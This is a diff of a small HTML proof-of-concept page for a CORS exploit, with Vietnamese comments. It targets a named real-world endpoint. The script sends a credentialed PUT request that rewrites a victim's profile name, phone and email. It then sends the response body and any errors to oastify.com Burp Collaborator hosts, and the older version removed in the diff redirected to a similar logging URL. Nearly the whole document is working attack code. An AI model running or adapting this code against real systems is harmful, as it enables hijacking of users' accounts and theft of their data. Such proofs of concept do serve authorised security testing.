@@ -1,13 +1,32 @@
+<!doctype html>
+<meta charset="utf-8">
+<h1>PUT JSON CORS PoC</h1>
 <script>
-var req = new XMLHttpRequest(); 
-req.onload = reqListener; 
-req.open('PUT','https://uapami.huuhong.com.vn:6805/uap/userSelf',true); 
-req.setRequestHeader('Content-Type', 'application/json')
-req.withCredentials = true;
-var jsonData = JSON.stringify({"name":"Admin viettel","phone":"085888888888","email":"vcstest_edited@gmail.com","photo_id":"7ce6a9381505428ab6533721a203f697"})
-req.send(jsonData);
+(async () => {
+  const target = "https://uapami.huuhong.com.vn:6805/uap/userSelf"; // đổi endpoint thực tế
+  const payload = {
+    "name": "Admin viettel",
+    "phone": "088888888888",
+    "email": "vcstest_edited@gmail.com",
+    "photo_id": "7ce6a9381505428ab6533721a203f697"
+  };
 
-function reqListener() {
-    location='//10z9te7efnsgwjdt6qsdcdgqzh58tzrng.oastify.com/log?key='+encodeURIComponent(this.responseText); 
-};
+  try {
+    const r = await fetch(target, {
+      method: "PUT",
+      credentials: "include",                 // gửi cookie/session của nạn nhân
+      headers: {
+        "Content-Type": "application/json"    // sẽ gây preflight
+      },
+      body: JSON.stringify(payload)
+    });
+
+    const text = await r.text();              // nếu CORS cho đọc response
+    // Exfiltrate status + body về Burp Collaborator/attacker
+    await fetch("https://ddul6qkqsz5s9vq5j25pppt2ctik6b7zw.oastify.com/log?st=" + r.status + "&d=" + encodeURIComponent(text));
+  } catch (e) {
+    // log lỗi về server attacker để bạn xem
+    await fetch("https://ddul6qkqsz5s9vq5j25pppt2ctik6b7zw.oastify.com/log?err=" + encodeURIComponent(String(e)));
+  }
+})();
 </script>
